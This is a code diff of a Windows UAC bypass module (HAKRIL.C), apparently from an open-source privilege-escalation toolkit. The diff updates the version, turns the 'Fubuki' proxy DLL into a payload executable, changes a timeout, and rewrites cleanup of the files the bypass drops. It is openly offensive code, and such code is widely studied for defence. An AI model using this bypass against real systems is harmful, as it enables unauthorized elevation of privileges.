@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2025
+*  (C) COPYRIGHT AUTHORS, 2017 - 2026
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     3.69
+*  VERSION:     3.71
 *
-*  DATE:        07 Jul 2025
+*  DATE:        23 Jul 2026
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -18,17 +18,6 @@
 *******************************************************************************/
 #include "global.h"
 #include "encresource.h"
-
-typedef ULONG_PTR(WINAPI* pfnAipFindLaunchAdminProcess)(
-    LPWSTR lpApplicationName,
-    LPWSTR lpParameters,
-    DWORD UacRequestFlag,
-    DWORD dwCreationFlags,
-    LPWSTR lpCurrentDirectory,
-    HWND hWnd,
-    PVOID StartupInfo,
-    PVOID ProcessInfo,
-    ELEVATION_REASON* ElevationReason);
 
 /*
 * ucmHakrilMethod
@@ -78,13 +67,17 @@ NTSTATUS ucmHakrilMethod(
             if (SnapinData == NULL)
                 break;
         }
-        else
+        else {
             break;
+        }
 
+        //
+        // Convert Fubuki into payload exe.
+        //
         if (!supReplaceDllEntryPoint(
             ProxyDll,
             ProxyDllSize,
-            FUBUKI_DEFAULT_ENTRYPOINT,
+            FUBUKI_EXE_ENTRYPOINT,
             TRUE))
         {
             break;
@@ -214,8 +207,9 @@ NTSTATUS ucmHakrilMethod(
                 ResumeThread(procInfo.hThread);
                 CloseHandle(procInfo.hThread);
             }
+
             if (procInfo.hProcess) {
-                if (WaitForSingleObject(procInfo.hProcess, 5000) == WAIT_TIMEOUT)
+                if (WaitForSingleObject(procInfo.hProcess, 2000) == WAIT_TIMEOUT)
                     TerminateProcess(procInfo.hProcess, 0);
                 CloseHandle(procInfo.hProcess);
             }
@@ -235,6 +229,10 @@ NTSTATUS ucmHakrilMethod(
         supSecureVirtualFree(SnapinData, SnapinSize, NULL);
     }
 
+    if (!NT_SUCCESS(MethodResult)) {
+        supSetGlobalCompletionEvent();
+    }
+
     return MethodResult;
 }
 
@@ -250,21 +248,29 @@ BOOL ucmHakrilMethodCleanup(
     VOID
 )
 {
-    SIZE_T Dummy;
+    LPCWSTR lpFiles[] = {
+        KAMIKAZE_MSC,
+        KAMIKAZE_LAUNCHER,
+        OSK_EXE
+    };
+
+    SIZE_T c, i;
+    BOOL bResult = FALSE;
     WCHAR szBuffer[MAX_PATH * 2];
 
     _strcpy(szBuffer, g_ctx->szTempDirectory);
-    Dummy = _strlen(szBuffer);
-    _strcat(szBuffer, KAMIKAZE_MSC);
-    DeleteFile(szBuffer);
+    c = _strlen(szBuffer);
 
-    Sleep(1000);
+    for (i = 0; i < RTL_NUMBER_OF(lpFiles); i++) {
 
-    szBuffer[Dummy] = 0;
-    _strcat(szBuffer, KAMIKAZE_LAUNCHER);
-    DeleteFile(szBuffer);
+        szBuffer[c] = 0;
+        _strcat(szBuffer, lpFiles[i]);
 
-    szBuffer[Dummy] = 0;
-    _strcat(szBuffer, OSK_EXE);
-    return DeleteFile(szBuffer);
+        if (i == 1)
+            Sleep(1000);
+
+        bResult = DeleteFile(szBuffer);
+    }
+
+    return bResult;
 }
